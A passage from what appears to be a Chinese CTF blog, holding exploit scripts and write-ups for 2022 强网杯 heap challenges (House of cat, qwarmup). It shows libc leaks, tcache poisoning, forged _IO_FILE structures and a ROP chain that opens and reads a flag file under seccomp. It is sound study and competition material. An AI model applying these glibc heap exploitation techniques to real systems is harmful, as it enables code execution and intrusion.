class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UAF</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 = calloc</span></span><br><span class="line"><span class="comment"># 2 = malloc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x200</span>,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(<span class="number">7</span>-i)</span><br><span class="line">UAF(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f6245836cc0</span> - <span class="number">0x00007f624561d000</span>)</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">wfile = libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xeacec</span>,<span class="number">0xeacef</span>,<span class="number">0xeacf2</span>]</span><br><span class="line">og = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1d0</span>,<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>,<span class="number">9</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1d0</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xf</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">L = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = L&lt;&lt;<span class="number">12</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(L ^ stderr))</span><br><span class="line">add(<span class="number">0x1d0</span>,<span class="number">9</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>,<span class="number">10</span>,<span class="number">2</span>) <span class="comment">#_IO_2_1_stderr_</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake = fake.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(heap_base+<span class="number">0x2a0</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(wfile) <span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line">fake2 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x68</span></span><br><span class="line">fake2 += p64(og)</span><br><span class="line">fake2 = fake2.ljust(<span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake2 += p64(heap_base+<span class="number">0x2a0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,fake2)</span><br><span class="line">edit(<span class="number">10</span>,fake)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="post-title-link" itemprop="url">2022强网杯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-04 18:30:39" itemprop="dateCreated datePublished" datetime="2022-08-04T18:30:39+08:00">2022-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-12 17:12:38" itemprop="dateModified" datetime="2022-08-12T17:12:38+08:00">2022-08-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今年的强网杯算上强网先锋总计好像有18题pwn，全部常规的堆题都是在glibc-2.35下的，所以应该都是围绕着IO_FILE部分作为核心考点。</p>
<h2 id="House-of-cat"><a href="#House-of-cat" class="headerlink" title="House of cat"></a>House of cat</h2><p>考点：代码审计绕过限制，orw，largebin_attack + house of apple，触发abort流程</p>
<p>比赛时遇到的问题：用largebin_attack去改Top chunk的size之后在触发abort之前挂了，常规的gadget + setcontext用不了</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>这题的出题人为了增加题目难度，在进入菜单之前还需要代码审计来输入一些东西过check，但是这部分主要是逻辑问题，写出来的意义不大，所以这里就跳过了。</p>
<p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.delete a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.mini edit\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input your cat choice:\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体就不贴了简单说一下：delete存在UAF，add最多16个堆指针，并且因为UAF的存在，最多申请也是16个堆，此外size都在lagrebin范围（0x418-0x46F），show固定输出三十个字节，edit固定写三十个字节，且最多使用两次。</p>
<p>此外这题的沙箱稍微有点特别，在read的那部分其check的文件描述符是否为0，如果不是则不通过。</p>
<p>绕过的方法就是先将标准输入关了，然后再open flag的时候flag文件对应的文件描述符就是0，由此通过check</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./house_of_cat </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0d 0xffffffff  if (A != 0xffffffff) goto 0018</span><br><span class="line"> 0005: 0x15 0x0b 0x00 0x0000013e  if (A == getrandom) goto 0017</span><br><span class="line"> 0006: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0017</span><br><span class="line"> 0007: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0017</span><br><span class="line"> 0008: 0x15 0x08 0x00 0x00000009  if (A == mmap) goto 0017</span><br><span class="line"> 0009: 0x15 0x07 0x00 0x0000000c  if (A == brk) goto 0017</span><br><span class="line"> 0010: 0x15 0x06 0x00 0x000000e7  if (A == exit_group) goto 0017</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0018</span><br><span class="line"> 0014: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0015: 0x15 0x01 0x02 0x00000000  if (A == 0x0) goto 0017 else goto 0018</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="house-of-kiwi中触发IO的方法"><a href="#house-of-kiwi中触发IO的方法" class="headerlink" title="house of kiwi中触发IO的方法"></a>house of kiwi中触发IO的方法</h4><p>当top chunk的size不足时，进入sysmalloc部分，其中存在这样的assert</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 2617   assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">  2618           ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">  2619            prev_inuse (old_top) &amp;&amp;</span><br><span class="line">  2620            ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br></pre></td></tr></table></figure>

<p>也就是说：<strong>top chunk的size小于MINSIZE、top chunk的inuse位为0以及top chunk未页对齐</strong>都会触发这个断言</p>
<p>触发这个断言之后会调用<code>__malloc_assert</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">		 const char *function)</span><br><span class="line">&#123;</span><br><span class="line">  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;,</span><br><span class="line">		     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (stderr);</span><br><span class="line">  abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>fflush(stderr)</code>就会调用<code>_IO_file_jumps</code>下的<code>sync</code>指针</p>
<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-1.jpg" class>

<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-2.jpg" class>

<p>这是其中一种触发方式，另一种如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);  <span class="comment">//bck == largebin的main_arena</span></span><br><span class="line">    fwd = bck-&gt;fd;  <span class="comment">//fwd == 此时largebin中最大的chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck) <span class="comment">//如果这个largebin非空</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br></pre></td></tr></table></figure>

<p>这一部分是<strong>将chunk插入lagrebin时</strong>执行的，只要此时对应largebin中的最小chunk的size中的<code>NON_MAIN_ARENA</code>标志位不为0，则触发这个断言</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br></pre></td></tr></table></figure>

<p>所以这两种触发方式一般可以通过堆溢出来完成，但是在没堆溢出的情况下<strong>可以通过稍微错位一下largebin_attack，将top chunk的size改成0x55这样的值</strong>也可以触发，或者更简单的方法就是直接将<code>malloc_state</code>中记录top chunk地址的那个值改了（位于<code>main_arena+96</code>），那top chunk就变成lagrebin_attack的那个堆地址了，大小也就变成了这个chunk的大小。</p>
<p>还有个要注意的点就是<code>fake_IO_FILE + 0x88</code>的这个位置（对应FILE结构的成员变量<code>_lock</code>）需要是一个合法地址，否则在这里会clash</p>
<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-3.jpg" class>

<p>现在有个疑问就是，<code>__fxprintf</code>也涉及IO，在该函数的调用链中也存在虚表函数指针的调用，所以在我调的exp中最后触发IO的地方其实是在调用<code>__fxprintf</code>函数的过程中，而不是<code>fflush</code>，那house of kiwi是怎么在<code>fflush</code>中触发的IO呢，目前还不是很懂，等复现完house of kiwi的例题之后再来补。</p>
<p>正常情况下在<code>__fxprintf</code>往后调用到<code>__vfprintf_internal</code>函数时会调用一个虚表函数指针</p>
<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-4.jpg" class>

<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-5.jpg" class>

<p>而如果要劫持<code>stderr</code>的话只要保证<code>fake_IO_FILE + 88</code>的这个位置是合法地址就能执行到这里。</p>
<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-6.jpg" class>

<p>那么后面就可以用到正常的<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273832.htm">house of apple</a>的调用链了</p>
<p>复现时ROP部分参考了<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=723">影二つ师傅</a>的博客，个人感觉这位师傅的fake_IO_struct的构造比较好，另外他使用了mmap来映射flag文件，也是替代read的一种方法，值得学习。</p>
<p>下面这块fake_IO_struct是我在师傅思路的基础上自己构造的，用的是house of apple中<strong>利用_IO_wfile_overflow函数控制程序执行流</strong>的那一条调用链，应该大多数情况是可以直接套用的，只需要将<code>fp</code>改成改chunk的头部即可，并且使用的gadget在<code>&lt;__spawni_child+1423&gt;</code>，具体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e9688f</span> &lt;__spawni_child+<span class="number">1423</span>&gt;:	mov    rdx,QWORD PTR [rax+<span class="number">0xb0</span>]</span><br><span class="line"><span class="number">0x7ffff7e96896</span> &lt;__spawni_child+<span class="number">1430</span>&gt;:	call   QWORD PTR [rax+<span class="number">0x88</span>]</span><br></pre></td></tr></table></figure>

<p>这个gadget本人第一次见到，所以不知道别的版本是否还有这个gadget（8.8日补充：好像从2.35开始才有这个gadget…）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">heap = heap_base</span><br><span class="line">gadget = libc_base + </span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">close = libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ret = libc_base + </span><br><span class="line">syscall = libc_base + </span><br><span class="line">pop_rax = libc_base + </span><br><span class="line">pop_rdi = libc_base + </span><br><span class="line">pop_rsi = libc_base + </span><br><span class="line">pop_rdx_r12 = libc_base + </span><br><span class="line"></span><br><span class="line">fp = heap + <span class="number">0x1370</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x30</span> + <span class="number">0x68</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x30</span>)  <span class="comment"># A = fp + 0x30</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext)	<span class="comment">#gadget call</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps-<span class="number">0x20</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x80</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xe0</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x30</span>)  <span class="comment"># B = A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>)  <span class="comment">#rsp</span></span><br><span class="line">fake_IO_FILE += p64(ret)  <span class="comment">#ret</span></span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(close) + p64(pop_rdi) + p64(fp + <span class="number">0x200</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="比赛时踩的坑"><a href="#比赛时踩的坑" class="headerlink" title="比赛时踩的坑"></a>比赛时踩的坑</h5><p>如果用largebin_attack直接将top chunk的size改成堆地址的话，会触发下面这个错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  4372       if (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">► 4373         malloc_printerr (&quot;malloc(): corrupted top size&quot;);</span><br></pre></td></tr></table></figure>

<p>这个check是试图从top chunk中划chunk时的，其检查top chunk的size是否在合理范围内（这个<code>system_mem</code>也是<code>malloc_state</code>中的一个字段）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p av-&gt;system_mem</span><br><span class="line">$4 = 0x21000</span><br></pre></td></tr></table></figure>

<p>比赛时居然连这个原因都没发现，只能说心还不够静，跟得太快了。</p>
<h2 id="qwarmup"><a href="#qwarmup" class="headerlink" title="qwarmup"></a>qwarmup</h2><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>程序主体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_13A4(a1, a2, a3);</span><br><span class="line">  read(<span class="number">0</span>, &amp;size, <span class="number">4uLL</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="number">0LL</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v4, <span class="number">1uLL</span>);</span><br><span class="line">    v6[buf] = v4;                               <span class="comment">// 以堆为基址，任意偏移写一字节</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Success!&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">    HIWORD(v3) = WORD1(size);</span><br><span class="line">    LOWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v3 );</span><br><span class="line">  _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>sub_13A4</code>设置了沙箱以及初始化堆，循环中的最后两行汇编如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000014</span>D6                 mov     eax, cs:size</span><br><span class="line">.text:<span class="number">00000000000014</span>DC                 mov     ax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000014E0</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">00000000000014E2</span>                 jz      <span class="keyword">short</span> loc_1474</span><br><span class="line">.text:<span class="number">00000000000014E4</span>                 mov     edi, <span class="number">0</span>          ; status</span><br><span class="line">.text:<span class="number">00000000000014E9</span>                 call    __Exit</span><br></pre></td></tr></table></figure>

<p>也就是如果size的值大于两个字节那么程序退出循环</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/07/08/close1%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
